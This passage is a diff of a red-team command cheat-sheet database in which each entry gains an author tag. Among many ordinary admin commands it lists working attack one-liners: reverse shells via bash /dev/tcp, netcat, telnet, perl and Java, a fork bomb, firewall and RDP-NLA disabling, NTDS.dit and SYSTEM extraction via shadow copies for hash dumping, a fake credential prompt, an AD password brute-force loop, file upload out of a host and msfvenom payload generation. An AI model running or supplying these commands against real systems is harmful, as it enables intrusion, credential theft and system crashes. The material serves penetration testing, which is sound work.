 exec 5<>/dev/tcp/[me]/[port]; while read line 0<&5; do $line 2>&5 >&5; done
 bash reverse shell using a file handle '5'
+Innes
 EOC
 Linux
 bash
@@ -2346,6 +2599,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
 rm -f /tmp/p; mknod /tmp/p p && nc [me] [port] 0/tmp/p
 telnet reverse shell
+Innes
 EOC
 Linux
 bash
@@ -2355,6 +2609,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
 telnet [me] [port]| /bin/bash | telnet [me] [lport]
 telnet reverse shell
+Innes
 EOC
 Linux
 bash
@@ -2364,6 +2619,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[me]:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 perl windows reverse shell
+Innes
 EOC
 Windows
 reverse shells
@@ -2373,6 +2629,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
 r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
 Java reverse shell - replace ; with newline
+Innes
 EOC
 Linux
 reverse shells
@@ -2380,8 +2637,9 @@ java
 EOT
 https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
-nmap -iL hosts -sC --script http-screenshot -p 80,443,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192 -v -n
-Take a screenshot
+nmap -iL hosts -sC --script http-screenshot -p 80,443,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192,6992,16993,16994,16995,623,664 -v -n
+Take a screenshot of a HTTP service
+Innes
 EOC
 Linux
 networking
@@ -2392,6 +2650,7 @@ https://github.com/SpiderLabs/Nmap-Tools/commit/36d74325f5ed5a057f954c1f9dd96263
 EOR
 modprobe nbd  max_part=16;  qemu-nbd -c /dev/nbd0 [File]; fdisk -l /dev/nbd0
 moount VDI disk image
+Innes
 EOC
 Linux
 filesystem
@@ -2400,6 +2659,7 @@ https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
 EOR
 losetup /dev/loop0 [file]; kpartx -a /dev/loop0; vgscan; vgchange -ay changethishostname-vg; mount /dev/changethishostname-vg/root mnt/
 Mount LVM filesytem / image
+Innes
 EOC
 Linux
 filesystem
@@ -2408,6 +2668,7 @@ https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
 EOR
 printf "%s" $i | ecryptfs-unwrap-passphrase .ecryptfs/victim/.ecryptfs/wrapped-passphrase -; ecryptfs-add-passphrase -fnek; mount -t ecryptfs .ecryptfs/victim/.Private/ test/
 Ecrypt FS mounting
+Innes
 EOC
 Linux
 filesystem
@@ -2416,6 +2677,7 @@ https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
 EOR
 cat DC_dump.txt | awk -F : '{print $1":"$4}' | sort -k 2 -t : > sorted_hash; cat ntlm_cracked | sort -k 1 > sorted_cracked; join -t : -1 2 sorted_hash -2 1 sorted_cracked  >> pass_info
 create medusa or hydra password list from cracked hashes
+Innes
 EOC
 passwords
 enumeration
@@ -2427,6 +2689,7 @@ http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
 EOR
 netstat -tulpen
 list network connections
+Innes
 EOC
 Linux
 bash
@@ -2436,6 +2699,7 @@ https://www.cyberciti.biz/tips/tag/netstat-command
 EOR
 ip xfrm state list
 print vpn keys
+Innes
 EOC
 Linux
 bash
@@ -2446,6 +2710,7 @@ https://www.cyberciti.biz/faq/linux-ip-command-examples-usage-syntax/
 EOR
 echo 1 > /proc/sys/net/ipv4/ip_forward
 enable ip forwarding in the kernel temporarily
+Innes
 EOC
 Linux
 bash
@@ -2456,6 +2721,7 @@ https://www.cyberciti.biz/faq/rhel-centos-fedora-linux-ip-forwarding-tutorial/
 EOR
 :(){:|:&;:
 Fork Bomb : CRASH SYSTEM
+Innes
 EOC
 Linux
 interesting
@@ -2464,6 +2730,7 @@ https://www.cyberciti.biz/faq/understanding-bash-fork-bomb/
 EOR
 iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j LOG; iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j DNAT --to-destination [rhost]:[rport]; iptables -A FORWARD -p tcp -d [ip] --dport [port] -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
 Iptables port forward
+Innes
 EOC
 Linux
 networking
@@ -2474,6 +2741,7 @@ http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Fir
 EOR
 logins -p
 list users without password
+Innes
 EOC
 enumeration
 user information
@@ -2483,6 +2751,7 @@ http://www.net.uom.gr/Books/Manuals/usail/man/solaris/logins.1.html
 EOR
 svsc -a
 list services
+Innes
 EOC
 process management
 solaris
@@ -2491,6 +2760,7 @@ http://www.oracle.com/technetwork/articles/servers-storage-admin/intro-smf-basic
 EOR
 prstat -a
 list processes
+Innes
 EOC
 process management
 solaris
@@ -2500,6 +2770,7 @@ http://solaris.reys.net/prstat-a-great-tool-for-process-monitoring/
 EOR
 ver
 system information
+Innes
 EOC
 Windows
 enumeration
@@ -2509,6 +2780,7 @@ https://technet.microsoft.com/en-us/library/bb491028.aspx
 EOR
 xterm -bg black -title "TryH4rD3r" -e "ls -la;read"
 Spawn a cmd in a gui window
+Innes
 EOC
 Linux
 bash
@@ -2518,6 +2790,7 @@ http://invisible-island.net/xterm/
 EOR
 rdpy-rdpscreenshot.py 1.1.1.1
 Take a screenshot of a RDP server (provided by rdpy)
+Innes
 EOC
 Linux
 scanning
@@ -2527,6 +2800,7 @@ https://github.com/citronneur/rdpy
 EOR
 xwd -display [victim] :0 -root -out /tmp/[victim].xpm;xwd -display ip :0 -root -out /tmp/[victim].xpm; convert /tmp/[victim]; xpm -resize 1280x1024 /tmp/[victim].jpg
 take a screenshot from a open X11 and convert it to a jpg
+Innes
 EOC
 Linux
 bash
@@ -2537,6 +2811,7 @@ http://unix.stackexchange.com/questions/44821/how-do-i-screencap-another-xorg-di
 EOR
 tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'
 capture ping replies
+Innes
 EOC
 Linux
 packet capture
@@ -2545,6 +2820,7 @@ http://rationallyparanoid.com/articles/tcpdump.html
 EOR
 systeminfo /S [victim] /U [domain]/[user] /P [pass]
 remote system info
+Innes
 EOC
 Windows
 enumeration
@@ -2554,6 +2830,7 @@ https://technet.microsoft.com/en-gb/library/bb491007.aspx
 EOR
 fsutil fsinfo drives
 list drives
+Innes
 EOC
 Windows
 forensics
@@ -2562,6 +2839,7 @@ https://technet.microsoft.com/en-us/library/cc753059(v=ws.11).aspx
 EOR
 reg query HKLM /f [text]  /t REG SZ /s
 search for text in the reg
+Innes
 EOC
 Windows
 enumeration
@@ -2573,6 +2851,7 @@ https://technet.microsoft.com/en-us/library/cc742028(v=ws.11).aspx
 EOR
 findstr /si [text] '.txt|xml|xls'
 grep for text in files
+Innes
 EOC
 Windows
 enumeration
@@ -2583,6 +2862,7 @@ https://technet.microsoft.com/en-gb/library/bb490907.aspx
 EOR
 net view /domain
 show hosts in the current domain or add a domain for searching
+Innes
 EOC
 Windows
 networking
@@ -2595,6 +2875,7 @@ https://technet.microsoft.com/en-us/library/bb490719.aspx
 EOR
 net share
 current smb shares
+Innes
 EOC
 Windows
 enumeration
@@ -2604,6 +2885,7 @@ https://technet.microsoft.com/en-us/library/bb490949.aspx
 EOR
 net session
 active sessions
+Innes
 EOC
 Windows
 smb
@@ -2614,6 +2896,7 @@ https://technet.microsoft.com/en-us/library/bb490712.aspx
 EOR
 net share [sharename] [folder] /GRANT:Everyone,FULL
 Share a directory with the world, probably don't want the world
+Innes
 EOC
 Windows
 Files
@@ -2624,6 +2907,7 @@ https://technet.microsoft.com/en-us/library/bb490712.aspx
 EOR
 sc \\[victim] create [name] binpath=[pathtoexe] start= auto
 Create a service on remote machine
+Innes
 EOC
 Windows
 EOT
@@ -2632,6 +2916,7 @@ https://technet.microsoft.com/en-us/library/cc990289(v=ws.11).aspx
 EOR
 xcopy /s \\[victim] \dir [directory]
 copy a remote file to lcwd
+Innes
 EOC
 Windows
 Files
@@ -2640,6 +2925,7 @@ https://technet.microsoft.com/en-gb/library/bb491035.aspx
 EOR
 shutdown /m \\[victim] /r /t 0 /f
 remote shutdown
+Innes
 EOC
 Windows
 EOT
@@ -2647,6 +2933,7 @@ https://technet.microsoft.com/en-gb/library/bb491003.aspx
 EOR
 ipconfig /displaydns
 show dnscache
+Innes
 EOC
 Windows
 networking
@@ -2658,6 +2945,7 @@ https://technet.microsoft.com/en-gb/library/bb490921.aspx
 EOR
 netstat -anop | findstr LISTEN
 listening ports
+Innes
 EOC
 Windows
 networking
@@ -2668,6 +2956,7 @@ https://technet.microsoft.com/en-us/library/bb490947.aspx
 EOR
 tftp -I [victim] GET [file]
 download a file, no longer default
+Innes
 EOC
 Windows
 Files
@@ -2676,6 +2965,7 @@ https://technet.microsoft.com/en-gb/library/bb491014.aspx
 EOR
 netsh interface ip show
 show interface information
+Innes
 EOC
 Windows
 networking
@@ -2685,6 +2975,7 @@ https://technet.microsoft.com/en-us/library/bb490939.aspx
 EOR
 netsh interface ip set address local static [ip] [mask] [gw] [ID]
 set static ip
+Innes
 EOC
 Windows
 networking
@@ -2694,6 +2985,7 @@ https://technet.microsoft.com/en-us/library/bb490939.aspx
 EOR
 netsh interface ip set dns local static [ip]
 set DNS server
+Innes
 EOC
 Windows
 networking
@@ -2703,6 +2995,7 @@ https://technet.microsoft.com/en-us/library/bb490939.aspx
 EOR
 netsh interface ip set address local dhcp
 enable DHCP
+Innes
 EOC
 Windows
 networking
@@ -2712,6 +3005,7 @@ https://technet.microsoft.com/en-us/library/bb490939.aspx
 EOR
 makecab [file]
 compress file
+Innes
 EOC
 Windows
 Files
@@ -2720,6 +3014,7 @@ https://technet.microsoft.com/en-us/library/hh875545(v=ws.11).aspx
 EOR
 wusa.exe /uninstall /kb: [id]
 uninstall patch : 2871997
+Innes
 EOC
 Windows
 interesting
@@ -2728,6 +3023,7 @@ https://support.microsoft.com/en-gb/help/934307/description-of-the-windows-updat
 EOR
 rundll32.dll user32.dll LockWorkstation
 lock the workstation
+Innes
 EOC
 Windows
 interesting
@@ -2736,6 +3032,7 @@ https://technet.microsoft.com/en-us/library/ee649171(v=ws.11).aspx
 EOR
 netsh advfirewall set currentprofile state off;netsh advfirewall set allprofiles state off;
 disable local firewall
+Innes
 EOC
 Windows
 networking
@@ -2746,6 +3043,7 @@ https://technet.microsoft.com/en-us/library/dd734783(v=ws.10).aspx
 EOR
 reg add HKCU\Software\Policies\microsoft\Windows\System /v DisableCHD /t
 re-enable CMD
+Innes
 EOC
 Windows
 pivoting
@@ -2755,6 +3053,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 psexec /accepteula \\[victim] -u [domain]\[user] -p [password] -c -f \\[victim]\[share\[file]
 windows psexec : \\127.0.0.1\c$\cmd.exe -p can be pass OR hash
+Innes
 EOC
 Windows
 pivoting
@@ -2764,6 +3063,7 @@ https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx
 EOR
 reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer" /v DenyTSConnections /t REG_DWORD /d 0 /f
 enable RDP
+Innes
 EOC
 Windows
 configuration
@@ -2772,6 +3072,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
 Disable NLA on RDP
+Innes
 EOC
 Windows
 configuration
@@ -2780,6 +3081,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 wmic startupwmic service
 start wmic service
+Innes
 EOC
 Windows
 EOT
@@ -2788,6 +3090,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic process list full
 list all processes
+Innes
 EOC
 Windows
 process management
@@ -2797,6 +3100,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic ntdomain list
 Domain and DC info
+Innes
 EOC
 Windows
 enumeration
@@ -2806,6 +3110,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic qfe
 list patches
+Innes
 EOC
 Windows
 enumeration
@@ -2817,6 +3122,7 @@ http://www.fuzzysecurity.com/tutorials/16.html
 EOR
 wrnic process call create "[cmd]"
 execute command
+Innes
 EOC
 Windows
 EOT
@@ -2825,6 +3131,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic process where name="[cmd]" call terminate
 kill process
+Innes
 EOC
 Windows
 process management
@@ -2834,6 +3141,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic logicaldisk get description,name
 view logical shares
+Innes
 EOC
 Windows
 enumeration
@@ -2844,6 +3152,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic /node:[victim] /user:[domain]\[user] /password:[password] process call create "\\[host]\[share]\[exe]"
 execute command on remote host from remote smb share
+Innes
 EOC
 Windows
 smb
@@ -2854,6 +3163,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic /node:[victim] computersystern get username
 get logged in users from the remote host
+Innes
 EOC
 Windows
 enumeration
@@ -2864,6 +3174,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic /node:[victim] process list brief /every:1
 list remote processes every second
+Innes
 EOC
 Windows
 enumeration
@@ -2874,6 +3185,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic /node:"[victim]" path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"
 enble rdp on remote host
+Innes
 EOC
 Windows
 configuration
@@ -2883,6 +3195,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic netlogin where (name like "%[user]%") get numberoflogons
 How many times has someone logged in
+Innes
 EOC
 Windows
 enumeration
@@ -2893,6 +3206,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\windows\\" | findstr /i /v """
 unquoted service path search add node for remote sys
+Innes
 EOC
 Windows
 enumeration
@@ -2903,6 +3217,7 @@ https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
 EOR
 wmic /node:[victim] /user:"[domain]\[user]" /password:[pass] process call create "cmd /c vssadmin list shadows 2 &1 >> c:\temp\vss.txt"
 List volume shadow copies
+@yght
 EOC
 Windows
 hashes
@@ -2914,6 +3229,7 @@ http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
 EOR
 wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c vssadmin create shadow /for=C: 2 &1 >> C:\temp\create_vss.txt"
 create volume shadow copy for c
+@yght
 EOC
 Windows
 hashes
@@ -2924,6 +3240,7 @@ http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
 EOR
 wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c copy \\?\GLOBALROOT\Device\[vsc]\Windows\System32\config\SYSTEM c:\temp\SYSTEM" 2 &1 >> c:\temp\copy_system.txt
 copy system out of a volume shadow copy
+@yght
 EOC
 Windows
 hashes
@@ -2934,6 +3251,7 @@ http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
 EOR
 wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c copy \\?\GLOBALROOT\Device\[vsc]\NTDS\NTDS.dit c:\temp\ntds.dit" 2 &1 >> c:\temp\copy_ntds.txt
 copy out ntds from the voulme shadow copy
+@yght
 EOC
 Windows
 hashes
@@ -2944,6 +3262,7 @@ http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
 EOR
 secretsdump.py  -hashes LMHASH:NTHASH -system ../SYSTEM -ntds ../ntds.dit local | tee hashes
 Parse the SYSTEM and ntds with impacket
+Innes
 EOC
 Windows
 hashes
@@ -2953,6 +3272,7 @@ https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
 EOR
 invoke-webrequest
 powershell wget
+Innes
 EOC
 Windows
 Files
@@ -2962,6 +3282,7 @@ https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility
 EOR
 wget
 also powershell wget
+Innes
 EOC
 Windows
 Files
@@ -2971,6 +3292,7 @@ https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility
 EOR
 (new-object system.net.webclient).downloadFile("[url]","[dest]")
 also powershell wget
+Innes
 EOC
 Windows
 Files
@@ -2980,6 +3302,7 @@ https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility
 EOR
 get-content
 powershell type file
+Innes
 EOC
 Windows
 Files
@@ -2989,6 +3312,7 @@ https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.m
 EOR
 get-service
 powershell services
+Innes
 EOC
 Windows
 powershell
@@ -2998,6 +3322,7 @@ https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.m
 EOR
 get-psdrive
 list of drives : cd Env:\ . . . mind . . . blown
+Innes
 EOC
 Windows
 interesting
@@ -3009,6 +3334,7 @@ https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.m
 EOR
 get-help
 RTFM *cough*
+Innes
 EOC
 Windows
 powershell
@@ -3017,6 +3343,7 @@ https://technet.microsoft.com/en-us/library/ee176848.aspx
 EOR
 get-wmiobject -list 'netework'
 list interfaces with wmi
+Innes
 EOC
 Windows
 powershell
@@ -3026,6 +3353,7 @@ https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.m
 EOR
 [Net.DNS]::GetHostEntry("ip")
 get dns addr tab after :: for more choices
+Innes
 EOC
 Windows
 dns
@@ -3035,6 +3363,7 @@ https://msdn.microsoft.com/en-us/library/ms143998(v=vs.110).aspx
 EOR
 Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt
 get system information
+Innes
 EOC
 Windows
 enumeration
@@ -3044,6 +3373,7 @@ http://www.energizedtech.com/2010/03/powershell-check-your-windows.html
 EOR
 New-PSDrive -Persist -PSProvider FileSjstem -Root \\[ip]\tools -Name i
 powershell mount remote share : think sysinternals remote share
+Innes
 EOC
 Windows
 Files
@@ -3054,6 +3384,7 @@ https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.m
 EOR
 Get-ChildItem -Path c:\ -Force -Recurse -Filter *.txt -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt "2017-01-13"}
 txt files changed after the 13 Jan 2017
+Innes
 EOC
 Windows
 Files
@@ -3064,6 +3395,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 $ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip ": "$port" : Closed";}else{echo $ip ": "$port" : Open";}$socket = $NULL;}}
 powershell port scanning
+Innes
 EOC
 Windows
 loop
@@ -3076,6 +3408,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 $ping = New-Object System.Net.Networkinformation.ping;$ping.Send("[ip]",50O);
 Ping ip with timeout of 500
+Innes
 EOC
 Windows
 networking
@@ -3085,6 +3418,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential("[title]","[message]","[user]","[domain]")
 Ask user for credentials
+Innes
 EOC
 Windows
 passwords
@@ -3094,6 +3428,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 powershell.exe -Command "do {if ((Get-Date -format yyyymmdd-HHmm) -match '201308(0[8-9]|1[0-1])|0[8-9]|1[0-7])[0-5][0-9]'){Start-Process -WindowStyle Hidden "[exe]";Start-Sleep -s 14400}}while(1)"
 powershell run on schedule, match says when run
+Innes
 EOC
 Windows
 powershell
@@ -3102,6 +3437,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 powershell.exe Send-MailMessage -to "[victim]" -from "[from]" -subject "[subject]" -a "[Attach file path]" -body "[Body]" -SmtpServer [ServerIP]
 Powershell send an email
+Innes
 EOC
 Windows
 interesting
@@ -3111,6 +3447,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 Get-WmiObject -ComputerName [DC] -Namesapce root\microsoftDNS -class MicrosoftDNS_ResourceRecord -Filter "domainname='[domain]' | select textrepresentation
 list hostname and ip for domain pc's
+Innes
 EOC
 Windows
 dns
@@ -3121,6 +3458,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server="[$ip]/[script]";$filepath="c:/temp/SYSTEM";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);"
 Powershell upload file VIA post, script must write this out
+Innes
 EOC
 Windows
 Files
@@ -3132,6 +3470,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 msfvenom -p Windows/meterpreter/reverse_https -f psh -a x86 LHOST=[lhost] LPORT=[lport] audit.ps1
 powershell shell
+Innes
 EOC
 metasploit
 av evasion
@@ -3141,6 +3480,7 @@ https://www.offensive-security.com/metasploit-unleashed/msfvenom/
 EOR
 HKLM\Software\Microsoft\Windows NT\CurrentVersion
 Windows information in the reg
+Innes
 EOC
 Windows
 enumeration
@@ -3150,6 +3490,7 @@ https://www.offensive-security.com/metasploit-unleashed/msfvenom/
 EOR
 HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU
 Mapped drives in reg
+Innes
 EOC
 Windows
 smb
@@ -3160,6 +3501,7 @@ https://www.offensive-security.com/metasploit-unleashed/msfvenom/
 EOR
 HKLM\System\MountedDevices
 Mounted devices
+Innes
 EOC
 Windows
 forensics
@@ -3168,6 +3510,7 @@ https://www.offensive-security.com/metasploit-unleashed/msfvenom/
 EOR
 HKLM\System\CurrentControlSet\Enum\USBStor
 USB Devices
+Innes
 EOC
 Windows
 forensics
@@ -3176,6 +3519,7 @@ https://www.offensive-security.com/metasploit-unleashed/msfvenom/
 EOR
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter
 enable ip routing in windows, use as GW
+Innes
 EOC
 Windows
 configuration
@@ -3184,6 +3528,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 HKLM\Security\Policy\PolAdTev
 Audit policy
+Innes
 EOC
 Windows
 forensics
@@ -3192,6 +3537,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services
 Kernel or User Services
+Innes
 EOC
 Windows
 EOT
@@ -3199,6 +3545,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 HKLM|HKCU\Software
 Machine or User software
+Innes
 EOC
 Windows
 enumeration
@@ -3208,6 +3555,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
 Recent Documents
+Innes
 EOC
 Windows
 enumeration
@@ -3217,6 +3565,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedMRU & \OpenSaveMRU
 Recent user location (MRU Most Recntly used)
+Innes
 EOC
 Windows
 enumeration
@@ -3226,6 +3575,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 HKCU\Software\Microsoft\Internet Explorer\TypedURLs
 Typed Urls
+Innes
 EOC
 Windows
 dns
@@ -3236,6 +3586,7 @@ https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
 EOR
 dsquery user -limit 0
 list users
+Innes
 EOC
 Windows
 enumeration
@@ -3245,6 +3596,7 @@ https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
 EOR
 dsquery group "cn=users,dc=[domain],dc=[tld]"
 List groups for domain.com
+Innes
 EOC
 Windows
 enumeration
@@ -3254,6 +3606,7 @@ https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
 EOR
 dsquery group -name "domain admins" | dsget group -members -expand
 Get Domain admins (prefer net groups "domain Admins")
+Innes
 EOC
 Windows
 enumeration
@@ -3263,6 +3616,7 @@ https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
 EOR
 dsquery user -name [user] | dsget user -memberof -expand
 get groups for user (net groups [user])
+Innes
 EOC
 Windows
 enumeration
@@ -3272,6 +3626,7 @@ https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
 EOR
 dsquery user -name [user] | dsget user -samid
 get user login name
+Innes
 EOC
 Windows
 enumeration
@@ -3281,6 +3636,7 @@ https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
 EOR
 dsquery user -inactive 2
 List accounts that have been inactive for two weeks
+Innes
 EOC
 Windows
 enumeration
@@ -3290,6 +3646,7 @@ https://technet.microsoft.com/fr-fr/library/cc725702(v=ws.10).aspx
 EOR
 dsquery * "DC=[domain],DC=[tld]" -scope subtree -attr "cn" "opperatingSystem"
 List os's in the domain
+Innes
 EOC
 Windows
 enumeration
@@ -3298,6 +3655,7 @@ https://technet.microsoft.com/en-us/library/cc731823(v=ws.11).aspx
 EOR
 dsquery site -o rdn -limit 0
 list site names
+Innes
 EOC
 Windows
 enumeration
@@ -3306,6 +3664,7 @@ https://technet.microsoft.com/en-us/library/cc731823(v=ws.11).aspx
 EOR
 dsquery subnet -site [site] -o rdn
 list subnets within the sites shown
+Innes
 EOC
 Windows
 networking
@@ -3315,6 +3674,7 @@ https://technet.microsoft.com/en-us/library/cc732207(v=ws.11).aspx
 EOR
 dsquery server -site [site] -o rdn
 list servers within site
+Innes
 EOC
 Windows
 dns
@@ -3324,6 +3684,7 @@ https://technet.microsoft.com/en-us/library/cc732885(v=ws.11).aspx
 EOR
 host [domain]
 list DC's
+Innes
 EOC
 Linux
 dns
@@ -3333,6 +3694,7 @@ https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
 EOR
 https://hashcat.net/wiki/doku.php?id=example_hashes
 hash list
+Innes
 EOC
 hashes
 web address
@@ -3341,6 +3703,7 @@ https://hashcat.net/wiki/doku.php?id=example_hashes
 EOR
 Function Test-ADAuthentication {param($username,$password);echo "$username $password";(new-object directoryservices.directoryentry"",$username,$password).psbase.name -ne $null}; forEach ($userName in Get-Content "user_logins.txt"){Test-ADAuthentication $userName password >> test4.txt;}
 Simple powershell brute force, user input list, checks the password 'password'
+Innes
 EOC
 Windows
 loop
@@ -3352,6 +3715,7 @@ http://serverfault.com/questions/596602/powershell-test-user-credentials-in-ad-w
 EOR
 common ports
 see /etc/services
+Innes
 EOC
 Linux
 networking
@@ -3361,6 +3725,7 @@ https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers
 EOR
 TTL: 128 = Windows | 64 = linux | 255 = generic OR solaris
 Networking Time to Live
+Innes
 EOC
 networking
 interesting
@@ -3369,6 +3734,7 @@ https://www.howtogeek.com/104337/hacker-geek-os-fingerprinting-with-ttl-and-tcp-
 EOR
 Window Size: 5840 = Linux | 5720 = Google Nix | 65535 = XP or BSD | 8192 = Visa and above | 4128 = Cisco Router
 Networking Time to Live
+Innes
 EOC
 reference
 networking
@@ -3376,8 +3742,9 @@ interesting
 EOT
 https://www.howtogeek.com/104337/hacker-geek-os-fingerprinting-with-ttl-and-tcp-window-sizes/
 EOR
-Class Ip ranges : Go away, there was ABCDE. WAS AS IN NOT ANY MORE!
+Class Ip ranges : Go away, there was A,B,C,D,E. WAS AS IN NOT ANY MORE!
 Classfull networks have not existed since 1993 cisco GTFO with telling people they exist
+Innes
 EOC
 networking
 interesting
@@ -3386,6 +3753,7 @@ https://en.wikipedia.org/wiki/Classful_network
 EOR
 Subnet ranges : /20 255.255.240.0 4096 hosts
 please use ipcalc, there is no l33tness in doing it in your head
+Innes
 EOC
 reference
 networking
@@ -3395,6 +3763,7 @@ https://www.aelius.com/njh/subnet_sheet.html
 EOR
 ipcalc -bnmp 10.0.0.1/20
 Ip subnets
+Innes
 EOC
 Linux
 networking
@@ -3405,6 +3774,7 @@ https://www.cyberciti.biz/tips/perform-simple-manipulation-of-ip-addresse.html
 EOR
 socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[RHOST]:[RPORT] ./[tool] 127.00.0.1:8080
 Route IPV6 through ipv4 for things that don't support it
+Innes
 EOC
 Linux
 pivoting
